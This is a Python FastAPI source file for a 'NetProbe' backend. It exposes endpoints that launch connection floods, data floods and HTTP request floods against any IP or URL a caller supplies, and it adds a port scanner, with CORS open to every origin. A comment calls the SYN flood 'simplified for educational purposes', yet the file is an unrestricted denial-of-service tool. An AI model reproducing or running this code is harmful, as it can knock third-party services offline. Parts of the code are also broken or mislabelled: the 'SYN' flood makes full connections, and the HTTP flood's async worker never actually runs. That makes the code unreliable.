from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
import asyncio
import socket
import requests

app = FastAPI(title="NetProbe Backend", version="1.0.0")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---------------------------------------------------
# Home / Status Check
# ---------------------------------------------------
@app.get("/")
def root():
    return {"status": "NetProbe backend running"}


# ---------------------------------------------------
# SYN Flood (Eğitim amaçlı basitleştirilmiş)
# ---------------------------------------------------
async def syn_flood(ip, port, duration):
    timeout = asyncio.get_event_loop().time() + duration
    while asyncio.get_event_loop().time() < timeout:
        try:
            s = socket.socket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(0.01)
            s.connect((ip, port))
            s.close()
        except:
            pass


@app.post("/attack/syn-flood")
async def attack_syn(payload: dict):
    ip = payload["ip"]
    port = payload["port"]
    duration = payload.get("duration", 5)

    asyncio.create_task(syn_flood(ip, port, duration))
    return {"status": "SYN flood started", "target": ip, "port": port}


# ---------------------------------------------------
# TCP Flood
# ---------------------------------------------------
async def tcp_flood(ip, port, duration):
    timeout = asyncio.get_event_loop().time() + duration
    data = b"X" * 1024

    while asyncio.get_event_loop().time() < timeout:
        try:
            s = socket.socket()
            s.connect((ip, port))
            s.sendall(data)
            s.close()
        except:
            pass


@app.post("/attack/tcp-flood")
async def attack_tcp(payload: dict):
    ip = payload["ip"]
    port = payload["port"]
    duration = payload.get("duration", 5)

    asyncio.create_task(tcp_flood(ip, port, duration))
    return {"status": "TCP flood started", "target": ip, "port": port}


# ---------------------------------------------------
# HTTP Stress Test
# ---------------------------------------------------
async def http_stress(url, threads, duration):
    timeout = asyncio.get_event_loop().time() + duration

    async def worker():
        while asyncio.get_event_loop().time() < timeout:
            try:
                requests.get(url)
            except:
                pass

    # Çoklu thread simülasyonu
    tasks = [asyncio.to_thread(worker) for _ in range(threads)]
    await asyncio.gather(*tasks)


@app.post("/attack/http-stress")
async def attack_http(payload: dict):
    url = payload["url"]
    threads = int(payload["threads"])
    duration = payload.get("duration", 5)

    asyncio.create_task(http_stress(url, threads, duration))
    return {"status": "HTTP stress started", "url": url, "threads": threads}


# ---------------------------------------------------
# Port Scan
# ---------------------------------------------------
def scan_ports(ip, ports):
    open_ports = []

    def check(port):
        try:
            s = socket.socket()
            s.settimeout(0.5)
            s.connect((ip, port))
            s.close()
            return True
        except:
            return False

    parsed_ports = []

    # Tek tek port listesi → 22,80,443
    if "," in ports:
        parsed_ports = [int(p) for p in ports.split(",")]

    # Aralık → 1-1024
    elif "-" in ports:
        start, end = ports.split("-")
        parsed_ports = list(range(int(start), int(end) + 1))

    for p in parsed_ports:
        if check(p):
            open_ports.append(p)

    return open_ports


@app.post("/scan/ports")
async def port_scan(payload: dict):
    ip = payload["ip"]
    ports = payload["ports"]

    result = scan_ports(ip, ports)
    return {"target": ip, "open_ports": result}
